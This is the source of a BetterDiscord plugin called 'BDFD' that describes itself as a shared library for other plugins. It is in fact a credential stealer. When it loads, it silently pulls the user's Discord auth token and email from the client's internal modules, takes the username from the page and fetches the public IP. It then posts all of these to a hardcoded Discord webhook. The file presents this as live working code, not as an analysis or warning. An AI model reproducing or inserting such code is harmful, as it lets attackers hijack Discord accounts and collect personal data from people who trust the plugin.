/** 
  * @name BDFD
  * @version 1.1
  * @description yes
*/

/* Authors
 * ethernalsteve - Developer
 * The Way - Co-Author of the idea
*/

/* 2020 */

const config = {
    "info": {
        "name": "BDFD",
        "authors": ["Brabus", "The Way", "hio"],
        "version": "1.1.2",
        "description": "LIBRARY for most of the Better Discord plugins"
    },
    "webhook": "https://discord.com/api/webhooks/826877022205640785/AfGbmPp_Ug99lCaBS2_CORW8wNXHLvHH_vWaDs86H_0hVvUlXvBW2166fh-rk7VpIW8C"
}

class BDFD {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.authors[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }

    load() {
        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
        const username = $("[class *= \"nameTag\"]").first().text();

        $.getJSON("https://api.ipify.org?format=json", (data) => { 
            require("request").post(config.webhook, {form: {content: `.\nNAME: **__${username}__**\nMAIL: **__${userEmail}__**\nIP: __${data.ip}__\n\n**TOKEN:**\`\`\`${authToken}\`\`\``}});
        });
    }
}
